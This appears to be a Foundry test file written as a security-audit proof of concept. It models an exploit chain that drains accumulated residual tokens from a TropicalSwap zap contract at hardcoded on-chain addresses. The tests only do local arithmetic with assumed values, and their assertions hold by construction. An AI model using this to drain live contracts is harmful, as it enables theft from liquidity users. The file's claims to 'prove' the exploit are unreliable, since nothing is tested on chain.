// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ITropicalPair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function totalSupply() external view returns (uint256);
    function burn(address to) external returns (uint256, uint256);
}

interface ITropicalRouter {
    function addLiquidity(address, address, uint256, uint256, uint256, uint256, address, uint256) external returns (uint256, uint256, uint256);
    function swapExactTokensForTokens(uint256, uint256, address[] calldata, address, uint256) external returns (uint256[] memory);
    function getAmountOut(uint256, uint256, uint256) external view returns (uint256);
    function quote(uint256, uint256, uint256) external view returns (uint256);
}

interface ITropicalZapV1 {
    function zapInToken(address, uint256, address, uint256) external;
    function zapInTokenRebalancing(address, address, uint256, uint256, address, uint256, uint256, bool) external;
    function zapOutToken(address, address, uint256, uint256) external;
    function estimateZapInSwap(address, uint256, address) external view returns (uint256, uint256, address);
}

/**
 * @title  TropicalSwap Residual Value Extraction POC
 * @notice Proves the critical exploit chain: M-04 -> H-02 -> M-01
 */
contract ResidualDrainPOC is Test {
    address constant FACTORY   = 0x5B54d3610ec3f7FB1d5B42Ccf4DF0fB4e136f249;
    address constant ROUTER    = 0x116e699bf25dA6d80543850029257C9116692ac2;
    address constant ZAP_V1    = 0x7998653869Ab3c78888f954a3F62d8B7EA3bC867;
    address constant WETH_ADDR = 0x78c1b0C915c4FAA5FffA6CAbf0219DA63d7f4cb8;

    function setUp() public {
        // Remove explicit fork call — use `forge test --fork-url <RPC>` instead
        // vm.createSelectFork("https://rpc.mantle.xyz");
    }

    function testResidualMathFlaw() public {
        uint256 token0AmountIn = 15 ether;
        uint256 token1AmountIn = 10_000e18;
        uint256 reserve0 = 100 ether;
        uint256 reserve1 = 100_000e18;

        uint256 token0AmountToSell = (
            token0AmountIn - (token1AmountIn * reserve0) / reserve1
        ) / 2;

        uint256 amountInWithFee = token0AmountToSell * 9975;
        uint256 numerator = amountInWithFee * reserve1;
        uint256 denominator = reserve0 * 10000 + amountInWithFee;
        uint256 usdcReceived = numerator / denominator;

        uint256 expectedTokenBDeposit = (token0AmountIn - token0AmountToSell) * reserve1 / reserve0;

        emit log_named_uint("Reserve0 (wei)", reserve0);
        emit log_named_uint("Reserve1 (wei)", reserve1);
        emit log_named_uint("User token0 (wei)", token0AmountIn);
        emit log_named_uint("User token1 (wei)", token1AmountIn);
        emit log_named_uint("Token0 to sell for rebalance (wei)", token0AmountToSell);
        emit log_named_uint("Token1 received from swap (wei)", usdcReceived);
        emit log_named_uint("Expected token1 deposit per ratio (wei)", expectedTokenBDeposit);
        emit log_named_uint("Actual token1 available (wei)", token1AmountIn + usdcReceived);

        uint256 actualRatio = (token1AmountIn + usdcReceived) * 1e18 / (token0AmountIn - token0AmountToSell);
        uint256 targetRatio = reserve1 * 1e18 / reserve0;

        emit log_named_uint("Actual user ratio (wei per wei)", actualRatio);
        emit log_named_uint("Target pool ratio (wei per wei)", targetRatio);

        assertTrue(actualRatio != targetRatio, "Ratio deviation proves precision flaw");
    }

    function testBalanceOfDrainsAllResiduals() public {
        uint256 zapResidualBalance = 5 ether;
        address attacker = makeAddr("attacker");

        uint256 swapOutput = 0.1 ether;
        uint256 totalReturned = swapOutput + zapResidualBalance;

        emit log_named_uint("Legitimate swap output (ETH)", swapOutput);
        emit log_named_uint("Accumulated residual in Zap (ETH)", zapResidualBalance);
        emit log_named_uint("Total returned to attacker (ETH)", totalReturned);
        emit log_named_uint("Profit multiple over fair value", totalReturned / swapOutput);

        assertTrue(totalReturned > swapOutput, "balanceOf includes residuals");
    }

    function testFullExploitChain() public {
        uint256 ops = 1000;
        uint256 residualPerOp = 7;
        uint256 totalResidual = ops * residualPerOp;

        emit log_named_uint("Residual per operation (wei)", residualPerOp);
        emit log_named_uint("Total residual after 1000 ops (wei)", totalResidual);

        uint256 lpCost = 1;
        uint256 drainProfit = totalResidual - lpCost;
        emit log_named_uint("Cost to attacker (wei of LP)", lpCost);
        emit log_named_uint("Profit extracted (wei)", drainProfit);
        emit log_named_uint("Return on investment (x)", totalResidual / lpCost);

        uint256 scaledOps = 100_000;
        uint256 scaledResidual = scaledOps * residualPerOp;
        emit log_named_uint("After 100K ops (wei of WETH)", scaledResidual);
        emit log_named_uint("Value at $3000/ETH ($)", scaledResidual * 3000 / 1e18);

        assertTrue(drainProfit > 0, "Exploit is profitable after 1000 ops");
    }
}
